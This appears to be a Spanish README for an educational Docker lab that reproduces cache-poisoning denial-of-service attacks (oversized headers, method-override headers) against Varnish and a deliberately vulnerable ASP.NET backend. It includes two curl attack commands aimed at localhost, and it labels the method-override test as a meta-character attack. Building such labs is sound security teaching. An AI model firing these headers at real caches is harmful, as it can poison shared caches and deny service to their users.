# **Laboratorio de Ataques HHO & HMC en Varnish + ASP.NET**  
**Pruebas de Cache Poisoning (CPDoS) con HTTP Header Oversize (HHO) y HTTP Meta Characters (HMC)**  

Este laboratorio permite simular ataques de envenenamiento de caché (**CPDoS**) usando:  
- **HTTP Header Oversize (HHO)**: Envío de headers anormalmente grandes para evadir cachés.  
- **HTTP Meta Characters (HMC)**: Inyección de caracteres de control (`\r`, `\n`, `\x00`, etc.) en headers.  

## **🚀 Tecnologías Usadas**  
- **Varnish Cache 6.0** (servidor de caché configurable).  
- **ASP.NET Core** (backend vulnerable para pruebas).  
- **Docker + Docker Compose** (entorno aislado y reproducible).  

---

## **📦 Estructura del Proyecto**  
```bash
.
├── docker-compose.yml          # Orquestación de contenedores
├── varnish/                   # Configuración de Varnish
│   ├── default.vcl            # Reglas de caché (sin sanitización estricta)
├── backend/                   # Aplicación ASP.NET Core
│   ├── Dockerfile             # Build del backend
│   ├── MethodOverrideMiddleware.cs   #Middleware que pide algun encabezazdo para sobre escribir
    ├── Program.cs             # Principla define rutas y metodos 
    ├── Data                   # Base de datos
    ├── Pages 
        ├── Index.cshtml       # Archivo con el html para el main
        ├── Index.cshtml.cs    # Archivo de la logica de pagian en C#
├── README.md                  # Este archivo
```

---

## **⚡ Instalación y Uso**  
1. **Clona el repositorio**:  
   ```bash
   git clone https://github.com/Samres27/lab-cache-poisoning-HMO-HHO lab-cache-poisoning
   cd lab-cache-poisoning
   ```

2. **Inicia los servicios con Docker**:  
   ```bash
   docker-compose up --build
   ```
   - **Varnish**: Escucha en `http://localhost:800`.  
   - **ASP.NET**: Backend en `http://backend:8080`.  

3. **Pruebas de Ataque**:  
   - **HHO (Header Oversize)**:  
     ```bash
     curl -H ": $(python3 -c 'print("A" * 15000)')" http://localhost:800/poisoned-content 
     ```
   - **HMO (Meta Characters)**:  
     ```bash
     curl -H "X-HTTP-Method-Override:DELETE" http://localhost:800/resource
     ```

---

## **🔍 Objetivos de las Pruebas**  
✅ Verificar si **Varnish** almacena respuestas corruptas en caché.  
✅ Confirmar si el **backend ASP.NET** procesa headers malformados.  

---

## **📌 Notas de Seguridad**  
⚠️ **Este laboratorio es solo para fines educativos**.  
⚠️ No ejecutes en entornos productivos sin ajustar las configuraciones de seguridad.  

---

## **📚 Recursos**  
- [Varnish Cache Documentation](https://varnish-cache.org/docs/)  
- [OWASP HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)  
- [CPDoS: Cache Poisoning Attacks](https://cpdos.org/)  

---


**¡Happy Hacking!** 🔥